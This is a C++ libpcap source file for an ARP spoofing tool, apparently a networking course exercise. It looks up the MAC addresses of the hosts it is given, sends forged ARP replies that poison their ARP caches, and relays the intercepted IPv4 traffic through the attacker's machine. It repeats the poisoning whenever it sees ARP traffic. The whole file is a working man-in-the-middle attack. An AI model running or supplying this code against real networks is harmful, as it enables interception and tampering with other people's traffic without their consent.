#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_addr.h"
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

struct EthArpPacket make_packet(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type) { 

	EthArpPacket packet;

	packet.eth_.dmac_ = ETH_dmac;
	packet.eth_.smac_ = ETH_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	if(type == 1) packet.arp_.op_ = htons(ArpHdr::Request);
	else if(type == 2) packet.arp_.op_ = htons(ArpHdr::Reply);
	else {
		printf("Invalid type\n");
		exit(1);
	}

	packet.arp_.smac_ = ARP_smac;
	packet.arp_.sip_ = htonl(ARP_sip);
	packet.arp_.tmac_ = ARP_tmac;
	packet.arp_.tip_ = htonl(ARP_tip);

	return packet;
}

Mac get_Mac(pcap_t* handle, Mac my_Mac, Ip my_Ip, Ip senderIp) {
	EthArpPacket packet;
	packet = make_packet(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	
	EthArpPacket *recvPacket = NULL;
	while (true) {
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		recvPacket = (struct EthArpPacket*) packet;
		if (recvPacket->eth_.type_ != htons(EthHdr::Arp)) continue;
		if (recvPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
		if (recvPacket->arp_.sip_ != htonl(senderIp)) continue;
		break;
	}
	return Mac(recvPacket->arp_.smac_);
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char my_mac_str[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	get_mac(my_mac_str, dev);
	Mac my_Mac = Mac(my_mac_str); 

	char my_ip_str[4] = {0x00, 0x00, 0x00, 0x00};
	get_ip(my_ip_str,dev);
	Ip my_Ip = Ip(my_ip_str);

	std::vector<std::pair<Ip, Ip>> ip_pair;
	std::vector<std::pair<Mac, Mac>> mac_pair;

	for (int i = 2; i < argc; i += 2) {
		ip_pair.push_back(make_pair(Ip(argv[i]), Ip(argv[i + 1])));
		mac_pair.push_back(make_pair(get_Mac(handle, my_Mac, my_Ip, (Ip)argv[i]), get_Mac(handle, my_Mac, my_Ip, (Ip)argv[i+1])));
	}
	for (int i = 0; i < ip_pair.size(); i++ ) {
		printf("[session %d] serder Ip : %s Mac : %s\n", i, ip_pair[i].first.operator std::string().c_str(), mac_pair[i].first.operator std::string().c_str());
		printf("[session %d] target Ip : %s Mac : %s\n", i, ip_pair[i].second.operator std::string().c_str(), mac_pair[i].second.operator std::string().c_str());
	}

	EthArpPacket packet;
	for (int i = 0; i < ip_pair.size(); i++) {
		packet = make_packet(mac_pair[i].first, my_Mac, my_Mac, mac_pair[i].first, ip_pair[i].second, ip_pair[i].first, 2);
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		printf("[session %d] %s ARP infect \n", i, ip_pair[i].first.operator std::string().c_str());
	}

	while(true) {
		struct pcap_pkthdr *header;
		const  u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr *spoof_packet = (EthHdr*)packet;
		bpf_u_int32 spoof_packetsize = header->caplen;
		for(int i = 0; i < ip_pair.size(); i++) {
			if(spoof_packet->smac() != mac_pair[i].first) continue;
			if(spoof_packet->dmac() != my_Mac) continue;
			if(spoof_packet->type() == EthHdr::Ip4) {
				spoof_packet->dmac_ = mac_pair[i].second;
				spoof_packet->smac_ = my_Mac;
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoof_packet), spoof_packetsize);
				if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				printf("[session %d] spoof packet relayed: %u bytes \n", i, spoof_packetsize);
			}
			if(spoof_packet->type() == EthHdr::Arp) {
				printf( "ARP packet is re-infected\n");
				EthArpPacket packet;
				for (int i = 0; i < ip_pair.size(); i++) {
					packet = make_packet(mac_pair[i].first, my_Mac, my_Mac, mac_pair[i].first, ip_pair[i].second, ip_pair[i].first, 2);
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
					if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
	ip_pair.clear();
	mac_pair.clear();
	pcap_close(handle);
}
